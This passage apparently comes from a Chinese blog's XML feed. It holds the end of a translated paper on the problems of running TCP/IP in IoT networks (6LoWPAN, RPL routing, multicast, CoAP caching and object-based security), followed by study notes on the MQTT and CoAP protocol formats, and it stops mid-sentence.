、低功耗的WIFI，这些技术通常使用相较于传统以太网链路更小的MTU和更低的传输速率。因此，一个对于IoT网络协议的直接挑战是将包大小适应于受限链路(在2.1节讨论)。为了节省能量，物联网节点可能不总是位于有线网络。此外，一个IoT系统可能被部署在没有有线网络基础设施的环境(例如，森林，水下，战场)，因此不得不依赖无线网络技术来通信。这给TCP/IP协议体系结构带来了更多的挑战，第一，mesh网络采用不被传统IP编址体系结构所支持的多链路子网模型(在2.2节讨论)。第二，广播和多播在以电池供电的网络来说是昂贵的，因为一个单独的多播将包含一系列多跳转发并且可能唤醒很多睡眠的节点(在2.3节讨论)。第三，一个可扩展的路由机制现在对于发生在网状网络上的IP通信是必须的(在2.4节讨论)。最后，TCP形式的可靠并且按序字节流传送对于需要为其数据定制控制和优先级的应用程序通常是不适合。 大多数IoT应用与大量传感器和执行器交互来在周围环境执行各种监控和控制任务。他们的设计模式本质上要求高效和可扩展的支持命名配置和发现，数据采集和驱动操作的安全保护，一个面向资源的通信接口，比如表现层状态转化（REST）。不幸的是，现存的那些问题的解决方案大多被今天的Web技术广泛的使用，不满足受限制的物联网环境。例如，传统的基于DNS的命名服务在缺乏基础设施支持的专用服务器的IoT部署场景中并不适用。应用层内容缓存和代理在断断续续连接的动态网络环境中通常是低效的。除此之外，基于信道的安全协议，比如TLS和DTLS，用于确保REST通信的安全，在IoT设备协议操作和资源消耗方面加以高额开销(在4.3节讨论)。 本文的剩余部分详细讨论了上述的每个问题，我们寻求确定导致难于将TCP/IP应用于IoT世界的原因。我们同样也调查了目前对于那些问题的解决方案，这些解决方案可能已被标准化或者正在被IETF积极开发，我们还分析了为什么他们通常不足够解决这些问题。本文的目的是提供见解并指出未来IoT网络体系结构的设计方向。 网络层存在的问题 IP，特别是IPv6，是为今天的因特网环境设计的，将台式机和笔记本电脑作为终端设备与有线连接的服务器通信。在这一节中，我们讨论当前主机和网络的哪些特性存在于IP中却并不再存在于IoT世界中，已经做了什么去裁剪IP和其他同类的协议去使它们适应IoT环境。 小MTU值 在IoT网络中受限的低能源链路通常只有很小的MTU值。例如，IEEE 802.15.4-2006最大的物理层帧大小仅仅为127字节，这与今天IP网络通常假定最小MTU值为1500字节甚至更高形成鲜明的对比。在20世纪90年代（早在IoT出现之前）为传统因特网开发的IPv6版本包括两个对于小的MTU链路存在问题的设计方案。第一，IPv6使用一个40字节的固定长度的头部，后跟可选的扩展头部，这给小包带来了一个大的协议开销，第二，IPv6规范要求所有能够运行IPv6的网络支持最小1280字节的MTU大小，这对受限链路是不现实的。 为了使IPv6适应于802.15.4网络，6LoWPAN阐述了在链路层和网络层之间存在一个适配层，实现了处理上面提到问题的两种机制：头部压缩和链路层分片。头部压缩允许除去未使用的区域(例如，流标签和流量类型)和冗余信息(例如，IPv6地址中的接口标识符可以由L2 MAC地址而得，因此被删去)。为了给应用程序负载留出足够的空间，它也为可扩展头部和UDP头部定义了压缩方案，这两种方案都频繁的用于IoT中。链路层帧隐藏了802.15.4的实际MTU大小并且给网络层错觉它运行在符合标准的能够支持1280字节MTU的链路。然而，很少有IoT应用发送的包能够达到MTU限制。 在IPv6中拥有固定长度的头部的主要目的是提高协议的处理速度。设定一个最小的MTU是为了避免网络内部包的分裂(该问题被广泛认为引起性能问题)和减小路由器的工作量。这两个原因都用于在现有因特网进行性能优化，没有考虑受限的小的MTU的物联网环境。适配层的加入填补了旧的设计与新的使用需求之间的不匹配，这不可避免地引入了额外的复杂性和开销。 多链路子网 当前的IPv4和IPv6子网模式考虑了两种二层网络：多访问链路(多个节点共享相同的访问媒介)，和点对点链路，在同一条链路中存在两个节点。这两种网络都假定相同子网的节点都可以一跳范围内互相可达。另一方面，一个IoT mesh网络包含一个二层设备连接在一起并且没有任何三层设备在其间的链路集合。这本质上创造了一个多链路子网模型，这是原始的IP地址体系结构没有预料到的。 RFC 4903，多链路子网问题，在文档中说明了IETF社区决定抛弃多链路子网模型的原因，因为在二层链路和IP子网之间的一一映射。主要的考虑围绕许多现存的协议依赖的一跳可达模型。首先，子网内的多链路转发给TTL/多跳限制处理带来了麻烦。在IP网络通过设置TTL/多跳限制为1或255并在接收时核实该值是否保持不变来将通信范围限制到一个单独的子网是常见做法。多链路子网模式将打破任何遵循这样做法的协议，因为进行IP多链路转发的节点将会有必要减少TTL/跳数限制值。第二个问题是链路范围内的多播不工作在没有给多播路由(这在今天的因特网中也是不可用的)适当支持的多链路子网。因此，在多链路子网中依赖链路范围内的多播的遗留协议(例如ARP、DHCP、邻居发现和多路由协议)将同样被打破。 根本上，上述问题是由旧的IP子网模式与新的物联网网状网络之间的不匹配造成的。为了避免这些技术问题，我们必须或者依赖二层机制将多链路透明的连接成一个单独的网络(类似于多个以太网段的桥接)，或者用不同的前缀将网状网络划分成多个子网。第一种方法需要一些形式的子网内部路由能力，这将在2.4节讨论。第二种方法介绍了一种在网络配置中的新的复杂性，因为前缀分配必须通过网状网络传播(例如，通过前缀代表)，网中的链路形式在动态环境中可能随着时间改变。 多播效率 许多基于IP的协议大量使用IP多播来实现两种功能之一：通知组中的所有成员，当并不确切地知道询问谁时做查询。然而，支持多播包传送对于受限的IoT网状网络是一个重大挑战。第一，大多数无线MAC地址协议禁用多播的链路层确认，在链路层丢包也不能被恢复。第二，由于同时存在的多种MAC协议(例如，不同版本的WIFI)和链路层速率适配，多播接收者将经历不同的数据传输速率。第三，IoT节点将不时地转换到睡眠模式来保存能量，因此可能会丢失一些多播包。最后，当节点通过一个网状网络连接，一个多播包需要沿着多路径经过多跳被转发，潜在地唤醒许多沉睡的节点并且使已经稀缺的网络资源超过负载。 为了应对在多播支持中的这些困难，遗留的协议必须重新设计以在IP多播被应用于约束IoT环境之前最小化使用IP多播。当物联网节点需要发送通知给多播接收者，而不是将包多播，他们可以暂时缓冲这些数据包在一些众所周知的位置，等待收件人按需通过单播拉取（根据他们的睡眠时间表）。当他们想要对一组进行查询，它们可以将查询发送到预先配置通过按优先级收集信息来回答问题的指定节点，而不是用多播在网络中洪泛。为了克服困难来支持多播同时适配睡眠节点，这些新的方法使用按需单播拉动取代组播。 一个对该协议的改进的例子是6LoWPAN的IPv6邻居发现优化。原始的IPv6邻居发现依靠多播得知默认网关路由器，解决邻居的IP解析到MAC地址，并进行重复地址检测。当将邻居发现功能适应于6LoWPAN，而不是周期地让路由器多播路由通告（这将唤醒睡眠节点或错过这些节点），优化的协议允许约束节点用路由请求消息按需更新路由通告信息。另一个扩展是在路由器上维护主机地址的注册表，使路由器能够响应地址解析和代表端节点的重复地址检测请求，因此查询节点通过单播消息简单地发送请求到默认路由器。 另一个解决方案叫做MPL（Multicast Protocol for Low power and Lossy Networks，用于低功耗和有损网络的组播协议），被IETF roll WG提出，从根本上改变约束网络上的转发语义。MPL在MPL转发者（即节点参与MPL）之间使用可控的洪泛通过同步在整个多播域内传播多播包，不需要任何组播路由协议来维护拓扑信息。每个多播包被包生成器ID和一个序列号标识，以便于允许重复检测。同时，近期的包被MPL转发者在变化窗口样式中缓存（例如，FIFO缓存），这能够被用于未来重传。这种新的多播转发协议已经被当前的ZigBee IP规范采纳。 网状网络路由 典型物联网网络的拓扑结构分为两类：星型拓扑结构和点对点mesh拓扑结构。在星型网络中路由配置是简单的，因为其中的集线器节点可以充当外围节点的默认网关。然而，星型拓扑的部署规模受到单一集线器节点信号覆盖的限制，使其不适用于覆盖广泛领域的应用场景。网状拓扑结构通过节点中继彼此的数据包使其能够大面积覆盖。因为洪泛整个网络太过昂贵，在网状网络内实现高效的数据包转发，路由机制是必要的。 网状网络路由可以支持在链路层或网络层。链路层方法，在IETF术语中称做mesh-under，依赖于2层代理来将多个链路加入到一个“单跳IP”子网。网络层方法，称作router-over，则是依赖IP路由器通过多跳转发数据包。在本段的剩余部分，我们描述了现有对于这两个类别的解决方案。 IEEE提出了802.15.5标准来支持由IEEE 802.15.4链路组成的网状网络的链路层路由。基本的做法是先为L2地址分配构造一颗穿过Mesh网络的生成树：生成树的根节点分配连续链路层地址块给它的子节点，进一步分配它的子块给它的后代。这种寻址方式保证同一祖先节点下的链路层地址落入同一范围内。一旦地址被分配，节点开始交换本地链路状态信息与他们的近邻，他们各自建立自己的两跳邻居表，包含邻居的地址块的范围，树的层次和跳距离。当转发数据包到一个超越两跳距离的目的地时，发送节点采用简单的探索选择下一跳，它接近生成树树根（从而更了解网络拓扑结构），但离发送节点不太远。这个解决方案的一个缺点是由于新节点动态加入网络，为了适应拓扑的变化，地址分配过程可能需要重新执行。 IETF通过router-over方法解决mesh网络的路由问题，并且已经开发了RPL（低功耗有损网络IPv6路由协议）作为当前的标准解决方案。RPL与IEEE 802.15.5本着同样的精神，它的模型节点的集群作为一个生成树称为目标导向的DAG（DODAG），所有的路径终止于根。当在DODAG内部两节点互相通信，它们的数据包遍历到根节点或公共祖先，然后按照向下链接到目的地。然而，不像IEEE 802.15.5 分配拓扑相关的L2地址，RPL不作出任何关于IP地址分配的假设。这有效地禁止路由条目聚集超出常用前缀共享。在根附近的节点维护这样的路由表变得非常具有挑战性，它在最坏的情况下，必须保留子网中每个设备的路由条目。RPL也提供了另一种“非存储”模式，它只有根节点维护路由表。当沿着下行链路路径转发数据包时，根节点需要将全部源路由信息插入到数据包报头中。虽然它减少了非根节点上的内存使用量，“非存储”模式增加了向下数据包的头部大小，这对于小MTU网络是有问题的（见2.1节）。 我们应该注意物联网中Mesh网络路由的根本挑战来自于在多链路环境中为每个主机维护路由信息的要求。传统IP网络中这不是一个问题，路由器或自学习网桥可以为路由和转发提供基础设施支持。然而，在受限的物联网环境，每个主机路由都由在网格中使用路由协议的每个节点来维护，在转发过程中消耗大量内存，或以IP数据包作为源路由，这与链路层小MTU限制冲突。由于IP的面向主机的通信语义，路由在基于IP的物联网网格技术里仍然将是一个重大的挑战。 传输层的问题 在TCP/IP体系结构中的传输层提供拥塞控制和可靠的交付，两者都是通过TCP来实现，它是在互联网中占主导地位的传输层协议。多年来，TCP被设计在一个点对点的没有严格的延迟要求的长期存活的连接有效地提供大容量的数据。它将发送者与接收者之间的通信建模为字节流，并执行可靠的顺序交付在流中的每一个字节。 然而，物联网应用常面临着各种各样TCP不能有效地支持的通信模式。第一，由于资源限制，设备可能经常进入睡眠模式，因此，在物联网应用中保持长期存活的连接是不可行的。第二，许多物联网通信只涉及少量的数据，建立连接的开销不可接受。第三，一些应用程序（如设备驱动）可能有低延迟的要求，不可容忍TCP握手引起的延迟。当工作在有损无线网络中时，TCP的按次序的交付和重传机制也可能导致队头阻塞，引入不必要的延迟。此外，大多数无线MAC协议也实现链路层自动重传请求（ARQ），如果二层转发延迟比TCP超时重传时间长，这可能进一步削弱TCP性能。 尽管一些工业物联网标准仍然要求TCP支持（比如ZigBee IP），但是越来越多的物联网协议决定将传输功能构建到应用层，选择UDP作为传输层协议，它基本上将传输层转换为复用模块。这种趋势强调了应用层成帧的需要。随着应用级成帧，网络可以识别单个应用程序数据单元，因此，从而实现更灵活的传输支持，例如，适用于不同类型的ADU不同的重传策略，使用网络内部缓存使数据分发更有效等。不幸的是，当前的TCP/IP体系结构不允许应用程序嵌入应用程序语义到网络层信息包，因此未能为应用层框架提供足够的支持。 应用层的问题 大多数物联网应用程序实施面向资源的请求响应通信模型。例如，监视应用程序请求传感器生成的数据；以及控制应用程序通过执行器请求操作物理对象。这些应用程序类似于今天的Web服务，采用REST架构在应用层通信。受Web取得巨大成功的影响，物联网社区一直致力于把REST架构带到物联网应用。例如，IETF的核心工作组定义了”约束应用协议”（COAP）标准，一个为资源受限环境定制的基于UDP的数据传输协议，为物联网应用提供REST式通信。在应用层实现REST的需求突出了在TCP/IP体系结构的低层缺少重要功能的支持，包括资源发现、缓存和安全。在这一部分中，我们探讨当前物联网应用弥补这些差距和限制他们的解决方案的局限性。 资源发现 资源导向型通信模型通常需要一个资源发现机制，通过它应用程序可以请求或调用资源的操作。在传统的IP网络资源发现的解决方案是基于DNS服务发现。然而，该解决方案支持物联网应用有几个限制。 首先，DNS-SD旨在支持服务发现，那里的服务通常是指一个正在运行的程序（例如，在某些打印机上运行的打印服务）。相对来说，在物联网的资源范围涵盖了更广泛的范围：除了服务，它也可以指物联网设备，传感器数据等。因此，物联网资源发现需要一个更一般的方法来识别异构资源。例如，不使用DNS记录，CoAP协议采用基于URI命名方案来标识资源（像HTTP）。在此基础上，IETF core 工作组提出了CoRE-RD，一种基于CoAP的资源发现机制，依赖较少约束的资源目录（RD）服务器存储资源托管在其他设备元。 其次，当专用的服务，如DNS和CoRE-RD，在本地环境中不可用时，传统的服务发现往往依赖于组播时。例如，DNS-SD使用组播DNS(MDNS)[5]作为本地网络中服务发现和名字解析的通信载体。然而，正如我们在第2.3节分析，在物联网环境中链路本地多播存在效率问题。使用多播的一种替代方案是同步资源元信息通过网络以一个对等的方式(这在精神上类似于我们在2.3讨论的MPL组播转发协议)。例如，IETF的homenet WG正在开发家庭网络控制协议(HNCP)使用由分布式节点一致性协议定义的同步机制来分发家庭网络配置(DNCP) 值得注意的是，这些解决方案的必要性是由于网络和TCP/IP传输层是无法发现通过应用层的定义名字的资源。例如，IPv6的邻居发现协议只能发现在网络层及以下配置。而在DNS SRV记录SD通常识别服务的IP地址和端口号。鉴于物联网应用中的资源发现的普遍需求，一个高效的物联网网络架构应包括资源发现作为其核心功能之一，并使应用程序免于实现自己的解决方案。 缓存 TCP/IP通信模型要求客户端（资源请求者）和服务器（资源持有者）同时在线。然而，在IoT场景，受限设备可能频繁的进入睡眠模式来节省能量。此外，动态和/或间歇性网络环境通常使它很难使通信双方保持稳定的连接。因此，IoT应用通常依赖缓存和代理来实现高效的数据分发。所选的代理节点可以代表睡眠节点请求资源并且暂时存储响应数据直到请求节点醒来。缓存的内容同样也可以被用来服务相同的来自其它共享同一个代理的节点的请求，这可以节省网络带宽并降低响应延迟。资源起源服务器也会指定一些代理节点来代表自己处理请求（被称为反向代理），因此，它可以减少客户端流量，并当它需要时候可以脱机。 虽然它是有益的，但是在IoT环境中应用层缓存通过CoAP和HTTP实现有几个限制。第一，为了利用内容缓存能力，客户机需要显式选择正向或反向代理节点。这些预先配置的缓存点对于所有客户端节点可能不是最佳的。客户端可以利用资源发现机制来按需查找附近的代理。但这样的解决方案对整个系统引入了额外的复杂度。第二，在连通性是间歇性的动态网络环境，预先选定的代理点可能成为完全不可达。当网络拓扑结构发生变化时，客户端需要重新配置或重新发现代理，否则停止使用缓存和代理。第三，缓存和代理打破了目前的安全协议假设的终端到终端的连接（我们将在第4.3节讨论），这使得保护应用程序数据变得更加困难。 为了使缓存功能在IoT环境中高效且灵活，网络体系结构需要在网络内部无处不在地提供机会缓存并且允许应用程序使用它们而不产生配置和通信开销。这进一步需要网络层知道应用层资源并且将缓存集成到转发过程中，以便当包在网络中传播时，每个网络包可以访问缓存。它也需要一个安全模型的根本变化以使网络内的缓存安全可靠。 安全 安全对于物联网应用程序是至关重要的，由于他们与物理世界的紧密互动。基于IP的应用的主流的安全性模型是基于信道的安全。比如安全传输层协议（TLS）和，它提供了源服务器和客户端之间的安全通信信道。然而，安全通道解决方案不适合到物联网环境有几个原因。 基于信道安全的第一个问题是建立一个安全信道的开销。TLS和DTLS都需要两次或更多轮的安全握手来对信道进行身份验证并且在第一个应用程序数据发送之前协商安全参数。 第二个问题是信道的两端必须保持信道状态直到它被关闭。这可能会对内存使用造成很大的压力，当一个设备需要在一个密集的网状网络同时与许多同等的设备进行通信。注意这个问题，连同第一个，导致一个艰难的权衡。减轻一个问题的努力。（例如，通过按需建立短暂的信道减少内存使用）可能使其他的恶化（例如，每一个新的短暂信道都会有自己的握手开销）。 最后但同样重要的是，一旦应用程序数据逃脱信道，基于信道的安全不能保证请求响应的安全性。当代理（比如，高速缓存和代理服务器）部署缓存应用程序数据，这是最麻烦的部分。资源的所有者需要信任代理正确地实施访问控制策略，而资源请求者需要信任代理提供真实的没有被篡改的数据。 上述限制突出了针对物联网应用的不同安全模型的需求。另一种模式，已在IETF提出了object-based security（基于对象的安全），这直接保证了应用数据单元而不是通过该信道的数据传输，每个数据对象都应该携带必要的认证信息（比如，数字签名），因此，无论数据如何检索，任何接收数据的人都可以验证其有效性。当数据保密性备受关注，数据的发起人可以对内容进行加密，以便只有预期接收者可以对数据进行解密。类似的想法使用基于对象的安全也出现了物联网区域之外，例如在IETF jose WG安全JSON对象。 重新思考体系结构 著名的间接性原则说：“计算机科学中的所有问题都可以通过另一个间接层解决”，但有一个问题不解决，是太多中间层的存在，其中精确描述了当前物联网网络架构的现状。 图1显示了基于IP的物联网堆栈的分层结构。为了支持REST接口，物联网的应用通常采用协议CoAP或HTTP作为作为消息传递协议。通常，应用程序还需要与消息层顶部的公共服务交互（比如COAP资源目录和对象安全支持）。传输层上方， TLS和DTLS被添加来保证通信信道的安全。此外，有多个基础设施服务为了方便IP网络通信，这是必要的，比如， ICMP, DHCP, 邻居发现(ND), DNS and RPL 如果我们通过聚焦来自应用程序视角的核心功能重新检查网络协议栈，我们将能够获得一个十分不同的图片，如图2所示。代替“everything over IP”,IoT应用程序以一个不同的范式聚集，该范式叫做“everything over REST”。在IoT协议栈底部，IoT协议栈使用数据传输协议，比如UDP和6LoWPAN。在协议栈的中心，一个REST的消息协议实现所有的服务组件，通过IoT应用程序定义的应用程序数据单元的简单抽象操作。新的视角和现存的协议栈层次视图的对比反映了IoT应用程序的期望和TCP/IP体系结构现实之间严重的不匹配。 REST层包含几个实现关键功能的子模块： 基于URI的将应用层数据交付到网络目的地的通信机制； 高效的数据分发缓存机制； 保护个人ADUs完整性和保密性的对象安全机制； 可以针对不同的网络环境实现多种算法的拥塞控制模块； 协助应用程序操作的命名配置与资源发现； 将不能融入一个单一的ADU的大数据分块的排序机制； 根据应用的需求支持包重传和排序的可靠性机制； 目前所有这些功能由应用层协议实现（包括REST接口本身）。然而，如果移动到核心网络，一些这些功能可以更有效。 总结 当TCP/IP协议栈在20世纪80年代早期首次开发，目标是通过有线连接主机计算机，尽管协议栈在IP规范发布后仍在不断演进，但是体系结构设计背后的基本假设没有改变。物联网网络代表了一种新型的应用程序，在没有显著修改协议栈的情况下IP体系结构不能很容易地适应它。 在本文中，我们讨论了TCP/IP协议应用到物联网的来自网络和传输层的挑战。我们还讨论了应用层协议，像COAP，如何为较低层不支持的所需功能提供自己的解决方案。从应用的角度来看，通过比较当前的物联网堆栈与所需的架构，不匹配更为明显。我们提出了一个体系结构的变化，移动RSET相关组件到到核心网络层，并且最终达到了一个比现有的应用层解决方案更高效的架构。这一新的物联网协议栈将拥抱ICN设计，天然地实现所需的功能，在网络内更高效。]]></content>
      <categories>
        <category>论文研读</category>
      </categories>
      <tags>
        <tag>IoT</tag>
        <tag>TCP/IP</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[MQTT协议学习笔记（一）]]></title>
    <url>%2F2017%2F03%2F04%2FMQTT%E5%8D%8F%E8%AE%AE%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%EF%BC%88%E4%B8%80%EF%BC%89%2F</url>
    <content type="text"><![CDATA[MQTT（Message Queuing Telemetry Transport），即消息队列遥测传输协议，是IBM开发的一种轻量级、基于代理的发布/订阅式的消息传输协议。 简介 MQTT 是一个客户端服务端架构的发布/订阅模式的消息传输协议。它的设计思想是轻巧、开放、简单、规范，因此易于实现。这些特点使得它对很多场景来说都是很好的选择，包括受限的环境如机器与机器的通信（M2M）以及物联网环境（IoT），这些场景要求很小的代码封装或者网络带宽非常昂贵。 实现MQTT协议需要：客户端和服务器端。 MQTT协议中有三种身份：发布者（Publish）、代理（Broker）（服务器）、订阅者（Subscribe）。其中，消息的发布者和订阅者都是客户端，消息代理是服务器，消息发布者可以同时是订阅者。 MQTT传输的消息分为：主题（Topic）和负载（payload）两部分。 Topic，可以理解为消息的类型，订阅者订阅（Subscribe）后，就会收到该主题的消息内容（payload）payload，可以理解为消息的内容，是指订阅者具体要使用的内容。 MQTT客户端 一个使用MQTT协议的应用程序或者设备，它总是建立到服务器的网络连接。客户端可以： 发布其他客户端可能会订阅的信息 订阅其它客户端发布的消息 退订或删除应用程序的消息 断开与服务器连接 MQTT服务器 MQTT服务器以称为“消息代理”（Broker），可以是一个应用程序或一台设备。它是位于消息发布者和订阅者之间，它可以： 接受来自客户的网络连接 接受客户发布的应用信息 处理来自客户端的订阅和退订请求 向订阅的客户转发应用程序消息 相关术语 订阅（Subscription） 订阅包含主题筛选器（Topic Filter）和最大服务质量（QoS）。订阅会与一个会话（Session）关联。一个会话可以包含多个订阅。每一个会话中的每个订阅都有一个不同的主题筛选器。 会话（Session） 每个客户端与服务器建立连接后就是一个会话，客户端和服务器之间有状态交互。会话存在于一个网络之间，也可能在客户端和服务器之间跨越多个连续的网络连接。 主题名（Topic Name） 连接到一个应用程序消息的标签，该标签与服务器的订阅相匹配。服务器会将消息发送给订阅所匹配标签的每个客户端。 主题筛选器（Topic Filter） 一个对主题名通配符筛选器，在订阅表达式中使用，表示订阅所匹配到的多个主题。 负载（Payload） 消息订阅者所具体接收的内容。 特点 使用发布/订阅消息模式，提供一对多的消息发布，解除应用程序耦合 对负载内容屏蔽的消息传输 使用 TCP/IP 提供网络连接 三种消息发布服务质量(Qos) “至多一次”，即Qos=0，会发生信息丢失，消息发布完全依赖底层 TCP/IP 网络。 “至少一次”，即Qos=1，确保消息到达，但消息重复可能会发生。 “只有一次”，即Qos=2，确保消息到达一次。 小型传输，开销很小（固定长度的头部是 2 字节），协议交换最小化，以降低网络流量。 控制报文格式 每个MQTT命令消息的消息头部都包含了一个固定头部。其中一些类型的消息可能还需要一个可变头部和一个有效载荷（可理解为消息体）。 MQTT协议通过交换预定义的MQTT控制包来实现的。一个MQTT控制包由3个部分组成，并总是按照如下顺序排列： — — Fixed header 固定报头，所有控制报文都包含 Variable header 可变报头，部分控制报文包含 Payload 有效载荷，部分控制报文包含 固定头部 每个MQTT命令消息的消息头部都包含一个固定头部。 MQTT 控制报文的类型 MQTT包含的控制包类型一共有14种，如下图： 用于指定控制报文类型的标志位 固定报头第 1 个字节的剩余的 4 位 [3-0]包含每个 MQTT 控制报文类型特定的标志 DUP =控制报文的重复分发标志 QoS = PUBLISH报文的服务质量等级 RETAIN = PUBLISH报文的保留标志 剩余长度 剩余长度（Remaining Length）表示当前报文剩余部分的字节数，包括可变报头和负载的数据。剩余长度不包括用于编码剩余长度字段本身的字节数。 可变报头 某些 MQTT 控制报文包含一个可变报头部分。它在固定报头和负载之间。可变报头的内容根据报文类型的不同而不同。可变报头的报文标识符（Packet Identifier）字段存在于在多个类型的报文里。 报文标识符 很多控制报文的可变报头部分包含一个两字节的报文标识符字段。这些报文是 PUBLISH（QoS&gt;0 时），PUBACK，PUBREC，PUBREL，PUBCOMP，SUBSCRIBE, SUBACK，UNSUBSCIBE，UNSUBACK。 包含报文标识符的控制报文： 有效载荷 某些 MQTT 控制报文在报文的最后部分包含一个有效载荷。例如，对于PUBLISH包而言，其有效载荷为应用层消息，对于SUBSCRIBE包而言，其有效载荷内容为主题过滤器列表，SUBACK包的有效载荷包含一个返回码列表。]]></content>
      <categories>
        <category>IoT</category>
        <category>MQTT</category>
      </categories>
      <tags>
        <tag>MQTT</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[CoAP协议详解（一）]]></title>
    <url>%2F2017%2F03%2F01%2FCoAP%E5%8D%8F%E8%AE%AE%E8%AF%A6%E8%A7%A3%EF%BC%88%E4%B8%80%EF%BC%89%2F</url>
    <content type="text"><![CDATA[CoAP(Constrained Application Protocol)协议是为物联网中资源受限设备制定的应用层协议。由于物联网中的很多设备都是资源受限型的，即只有少量的内存空间和有限的计算能力，所以传统的HTTP协议应用在物联网上就显得过于庞大而不适用。IETF的CoRE工作组提出了一种基于REST架构的CoAP协议。 CoAP简介 CoAP是一种应用层协议，它运行于UDP协议之上而不是像HTTP那样运行于TCP之上。 CoAP协议基于REST 构架，REST 是指表述性状态转换架构，是互联网资源访问协议的一般性设计风格。为了克服HTTP对于受限环境的劣势，CoAP既考虑到数据报长度的最优化，又考虑到提供可靠通信。一方面，CoAP提供URI，REST 式的方法如GET，POST，PUT和DELETE，以及可以独立定义的头选项提供的可扩展性。另一方面，CoAP基于轻量级的UDP协议，并且允许IP多播。而组通信是物联网最重要的需求之一，比如说用于自动化应用中。为了弥补UDP传输的不可靠性，CoAP定义了带有重传机制的事务处理机制。并且提供资源发现机制，并带有资源描述。 CoAP的特点 CoAP采用了二进制报头，而不是文本报头(text header)。 CoAP降低了头的可用选项的数量。 CoAP减少了一些HTTP的方法。 CoAP可以支持检测装置。 CoAP与Http协议 CoAP协议不是盲目的压缩了HTTP协议，考虑到资源受限设备的低处理能力和低功耗限制，CoAP重新设计了HTTP的部分功能以适应设备的约束条件。另外，为了使协议适应物联网和M2M 应用，CoAP协议改进了一些机制，同时增加了一些功能。图1 显示了HTTP和CoAP的协议栈。CoAP和HTTP在传输层有明显的区别。HTTP协议的传输层采用了TCP协议，而CoAP协议的传输层使用UDP协议，开销明显降低，并支持多播。 CoAP协议采用了双层的结构。事务层(Transaction layer)处理节点间的信息交换，同时，也提供对多播和拥塞控制的支持。请求/响应层(Request/Response layer)用以传输对资源进行操作的请求和相应信息。CoAP协议的REST 构架基于该层的通信，REST请求附在一个CON 或者NON消息上，而REST响应附在匹配的ACK消息上。CoAP的双层处理方式，使得CoAP没有采用TCP协议，也可以提供可靠的传输机制。利用默认的定时器和指数增长的重传间隔时间实现 CON消息的重传，直到接收方发出确认消息。另外，CoAP的双层处理方式支持异步通信，这是物联网和M2M应用的关键需求之一。 CoAP报文报文格式CoAP协议非常小巧，一个CoAP消息最小为4个字节，以下是CoAP协议不同部分的描述： 【Ver】版本编号，指示CoAP协议的版本号。类似于HTTP 1.0 HTTP 1.1。版本编号占2位，取值为01B。 【T】报文类型，CoAP协议定了4种不同形式的报文，CON报文，NON报文，ACK报文和RST报文。 【TKL】CoAP标识符长度。CoAP协议中具有两种功能相似的标识符，一种为Message ID(报文编号)，一种为Token(标识符)。其中每个报文均包含消息编号，但是标识符对于报文来说是非必须的。 【Code】功能码/响应码。Code在CoAP请求报文和响应报文中具有不同的表现形式，Code占一个字节，它被分成了两部分，前3位一部分，后5位一部分，为了方便描述它被写成了c.dd结构。其中0.XX表示CoAP请求的某种方法，而2.XX、4.XX或5.XX则表示CoAP响应的某种具体表现。 【消息ID Message ID】每个CoAP消息都有一个ID，在一次会话中ID总是保持不变。但在这个会话之后该ID会被回收利用。 【标记 Token】标识符具体内容，通过TKL指定Token长度。 【选项 Options】：CoAP报文选项类似于HTTP请求头，它包括CoAP消息本身，例如CoAP端口号，CoAP主机和CoAP查询字符串等。 【1111 1111】CoAP报文和具体负载之间的分隔符。 【负载Payload】：真正有用的被交互的数据。 Option格式（1）组成部分 一般情况下Option部分包含Option Delta、Option Length和Option Value三部分。 【Option Delta】表示Option的增量，当前的Option的具体编号等于之前所有Option Delta的总和。 【Option Length】表示Option Value的具体长度。 【Option Value】表示Option具体内容。 （2）Option类型及编号 CoAP中所有的Option都采用编号的方式，这些Option及编号的定义如下图所示。 在这些option中，Uri-Host、Uri-Port、Uri-Path和Uri-Query等和资源“位置”和参数有关。 【3】Uri-Host:CoAP主机名称，例如iot.eclipse.org 【7】Uri-Port:CoAP端口号，默认为5683 【11】Uri-Path:资源路由或路径，例如\temperature。资源路径采用UTF8字符串形式，长度不计第一个”\”。 【15】Uri-Query:访问资源参数，例如?value1=1&amp;value2=2，参数与参数之间使用“&amp;”分隔，Uri-Query和Uri-Path之间采用“?”分隔。 在这些option中，Content-Format和Accept用于表示CoAP负载的媒体格式 【12】Content-Format:指定CoAP复杂媒体类型，媒体类型采用整数描述，例如application/json对应整数50，application/octet-stream对应整数40。 【17】Accept: 指定CoAP响应复杂中的媒体类型，媒体类型的定义和Content-Format相同。 （3）Content-Format 【text/plain】 编号为0，表示负载为字符串形式，默认为UTF8编码。 【application/link-format】编号为40，CoAP资源发现协议中追加定义，该媒体类型为CoAP协议特有。 【application/xml】编号为41，表示负载类型为XML格式。 【application/octet-stream】编号为42，表示负载类型为二进制格式。 【application/exi】编号为47，表示负载类型为“精简XML”格式。 另外，还有一种格式也被IANA认定，也会在CoAP协议中广泛使用那便是CBOR格式，该格式可理解为二进制JSON格式。 【applicaiton/cbor】编号为60。 消息类型CoAP采用与HTTP协议相同的请求响应工作模式，CoAP协议共有4中不同的消息类型： CON：需要被确认的请求，如果CON请求被发送，那么对方必须做出响应。 NON：不需要被确认的请求，如果NON请求被发送，那么对方不必做出回应。 ACK：应答消息，接受到CON消息的响应。 RST：复位消息，当接收者接收到的消息包含一个错误，接收者解析消息或者不再关心发送者发送的内容，那么复位消息将会被发送。 CoAP请求请求方法在CoAP请求中，Code被定义为CoAP请求方法，这些方法有GET、POST、PUT和DELETE，这些方法和HTTP协议非常相似。 GET方法：用于获得请求URI标识的资源 The GET method is safe and idempotent. POST方法：用于创建新资源或更新目标资源 POST is neither safe nor idempotent. PUT方法：用于更新某资源 PUT is not safe but is idempotent. DELETE方法：用于删除某资源 DELETE is not safe but is idempotent. 需要说明的问题（1）safe 上面的英文是RFC 7252 文档的内容，其中的安全是指是否会改变服务器端的数据，而不是我们通常所说的数据的保密性。因为如果考虑到某些服务端和客户端的默认配置和默认使用方式，那么POST在很多时候比GET安全，因为GET的URL会被放在浏览器历史和WEB服务器日志里面。 （2）idempotent idempotent的意思就是指CoAP方法重复执行多次，产生的效果是一样的。往一个URI发送一个CoAP的 